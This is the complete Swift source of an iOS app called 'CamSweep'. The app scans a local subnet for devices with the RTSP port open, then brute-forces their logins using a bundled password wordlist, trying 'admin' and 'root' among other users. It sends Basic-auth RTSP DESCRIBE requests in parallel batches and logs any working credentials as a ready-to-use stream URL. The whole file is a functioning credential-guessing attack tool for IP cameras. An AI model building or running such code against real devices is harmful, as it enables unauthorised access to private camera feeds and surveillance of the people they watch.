import SwiftUI
import Network

struct Credential { let user: String; let pass: String }

class CameraScanner: ObservableObject {
    @Published var logs: String = ""
    @Published var isScanning: Bool = false
    private var credentials: [Credential] = []
    
    init() { loadWordlist() }
    
    func loadWordlist() {
        guard let path = Bundle.main.path(forResource: "passwords", ofType: "txt"),
              let content = try? String(contentsOfFile: path) else {
            log("[-] passwords.txt not found."); return
        }
        for line in content.components(separatedBy: .newlines) {
            let parts = line.split(separator: ":", maxSplits: 1).map(String.init)
            if parts.count == 2 { credentials.append(Credential(user: parts[0], pass: parts[1])) }
            else if parts.count == 1 && !parts[0].isEmpty {
                credentials.append(Credential(user: "admin", pass: parts[0]))
                credentials.append(Credential(user: "root", pass: parts[0]))
            }
        }
        log("[*] Loaded \(credentials.count) passwords.")
    }
    
    func log(_ text: String) { DispatchQueue.main.async { self.logs += text + "\n" } }
    
    func startScan(ipRange: String) {
        isScanning = true; logs = ""
        Task {
            for i in 1...254 {
                let ip = "\(ipRange).\(i)"
                await checkHost(ip: ip)
            }
            DispatchQueue.main.async { self.isScanning = false; self.log("[*] Scan complete.") }
        }
    }
    
    func checkHost(ip: String) async {
        let rtspOpen = await checkPort(host: ip, port: 554)
        if rtspOpen {
            log("[+] \(ip) RTSP port open. Bruteforcing...")
            await bruteRTSP(ip: ip)
        }
    }
    
    func checkPort(host: String, port: UInt16) async -> Bool {
        return await withCheckedContinuation { cont in
            let conn = NWConnection(host: NWEndpoint.Host(host), port: NWEndpoint.Port(rawValue: port)!, using: .tcp)
            var hasResumed = false
            conn.stateUpdateHandler = { state in
                if case .ready = state, !hasResumed { hasResumed = true; cont.resume(returning: true); conn.cancel() }
                else if case .failed = state, !hasResumed { hasResumed = true; cont.resume(returning: false) }
            }
            conn.start(queue: .global())
            DispatchQueue.global().asyncAfter(deadline: .now() + 1.0) {
                if !hasResumed { hasResumed = true; conn.cancel(); cont.resume(returning: false) }
            }
        }
    }
    
    func bruteRTSP(ip: String) async {
        let chunkSize = 50
        for i in stride(from: 0, to: credentials.count, by: chunkSize) {
            let chunk = Array(credentials[i..<min(i+chunkSize, credentials.count)])
            let found = await withTaskGroup(of: String?.self) { group -> String? in
                for cred in chunk {
                    group.addTask { return await self.tryRTSP(ip: ip, user: cred.user, pass: cred.pass) }
                }
                for await res in group { if let s = res { group.cancelAll(); return s } }
                return nil
            }
            if let url = found { log("[!!!] FOUND: \(url)"); return }
        }
        log("[-] No password found for \(ip).")
    }
    
    func tryRTSP(ip: String, user: String, pass: String) async -> String? {
        return await withCheckedContinuation { cont in
            let conn = NWConnection(host: NWEndpoint.Host(ip), port: 554, using: .tcp)
            var hasResumed = false
            let authData = "\(user):\(pass)".data(using: .utf8)!.base64EncodedString()
            let req = "DESCRIBE rtsp://\(ip):554/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic \(authData)\r\n\r\n"
            
            conn.stateUpdateHandler = { state in
                if case .ready = state {
                    conn.send(content: req.data(using: .utf8), completion: .contentProcessed({ _ in
                        conn.receive(minimumIncompleteLength: 1, maximumLength: 1024) { data, _, _, _ in
                            if let data = data, let str = String(data: data, encoding: .utf8), str.contains("200 OK") {
                                if !hasResumed { hasResumed = true; cont.resume(returning: "rtsp://\(user):\(pass)@\(ip)"); conn.cancel(); return }
                            }
                            if !hasResumed { hasResumed = true; conn.cancel(); cont.resume(returning: nil) }
                        }
                    }))
                } else if case .failed = state {
                    if !hasResumed { hasResumed = true; cont.resume(returning: nil) }
                }
            }
            conn.start(queue: .global())
            DispatchQueue.global().asyncAfter(deadline: .now() + 1.5) {
                if !hasResumed { hasResumed = true; conn.cancel(); cont.resume(returning: nil) }
            }
        }
    }
}

struct ContentView: View {
    @StateObject private var scanner = CameraScanner()
    @State private var ipRange: String = "192.168.1"
    
    var body: some View {
        NavigationView {
            VStack {
                HStack {
                    TextField("Subnet", text: $ipRange)
                        .textFieldStyle(RoundedBorderTextFieldStyle()).keyboardType(.numbersAndPunctuation)
                    Button("Scan") { scanner.startScan(ipRange: ipRange) }
                        .disabled(scanner.isScanning).buttonStyle(.borderedProminent)
                }.padding()
                ScrollView {
                    Text(scanner.logs).font(.system(.footnote, design: .monospaced))
                        .frame(maxWidth: .infinity, alignment: .leading).padding()
                }
            }.navigationTitle("CamSweep")
        }
    }
}
